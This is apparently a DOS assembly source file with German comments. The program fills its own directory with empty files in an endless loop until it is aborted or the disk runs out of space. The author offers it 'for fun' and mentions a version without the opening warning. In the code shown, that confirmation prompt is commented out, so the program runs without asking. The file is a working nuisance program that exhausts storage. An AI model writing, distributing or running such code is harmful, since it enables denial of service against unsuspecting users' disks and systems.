;die programm erstellt max. 95060119441637376 Dateien in dem Verzeichnis, in dem es sich
;befindet. die dateinamen werden nach einer tollen formel erzeugt. gestoppt werden muss
;durch Abbruch oder Platzmangel. (Bei einer 1,44MB Floppy schon bei 224 Dateien)
;das Ausführbare Programm gibts bei RafaelFriesen@aol.com (auch ohne die Meldung am Anfang)
;viel Spass damit wünscht Rafael Friesen

.model tiny
.code
;Meld ausgeben
;mov dx,offset Meld
;mov ax,0900h
;int 21h
;mov ax,0700h
;int 21h
;cmp al,13
;je losgehts
;mov ax,4c00h
;int 21h
;losgehts:

;viele dateien erzeugen
los:
;datei öffnen
mov ax,03c00
xor cx,cx
mov dx,offset dat
int 021
;datei schliessen
mov bx,ax
mov ax,03e00
int 021

;nächsten Dateinamen generieren
;erste Stelle
mov al,[offset dat]
inc al
cmp al,"Z"
jle eins
mov al,"A"
dec b[offset dat+1]
eins: 
mov [offset dat],al
;restliche Stellen des Dateinamens
mov bx,1
zwei:
mov al,[offset dat+bx]
inc al
cmp al,"9"
jne drei
mov al,"A"
drei:
cmp al,"Z"
jle vier
mov al,"0"
dec b[offset dat+1+bx]
vier: 
mov [offset dat+bx],al
inc bx
cmp bx,8
jne funf
cmp b[offset dat+8],"."
je sechs
inc b[offset dat+8]
dec b[offset dat+9]
sechs:
inc bx
funf:
cmp bx,11
jle zwei
cmp b[offset dat+12],0
je sieben
inc b[offset dat+12]
sieben:
;zum anfang
jmp los


.data
;Meld:	db "Dieses Programm erzeugt viele Dateien.",0d,0a
;	db "Der Autor: Rafael Friesen",0d,0a
;	db "Soll dieses Programm nun ausgeführt werden, dann jetzt bitte Enter drücken!",0d,0a,"$"
dat:	db "RAFAELRU.LES",0  ;oder A0000000.000
end